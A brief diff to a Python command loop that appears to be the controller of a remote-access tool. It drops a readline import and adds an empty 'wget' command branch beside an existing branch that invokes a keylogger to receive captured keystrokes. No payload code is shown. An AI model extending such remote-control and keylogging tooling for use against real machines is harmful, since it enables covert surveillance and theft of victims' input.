@@ -8,7 +8,6 @@ import signal
 import sys
 import os
 import re
-import readline
 
 def parse_command(command, server):
 	server.send(command)
@@ -60,6 +59,8 @@ def main_loop(server):
 			from keylogger import Keylogger
 			keylogger = Keylogger(server)
 			keylogger.receive()
+		elif cmd == "wget":
+			pass
 		elif cmd == "exit":
 			return
 		else:
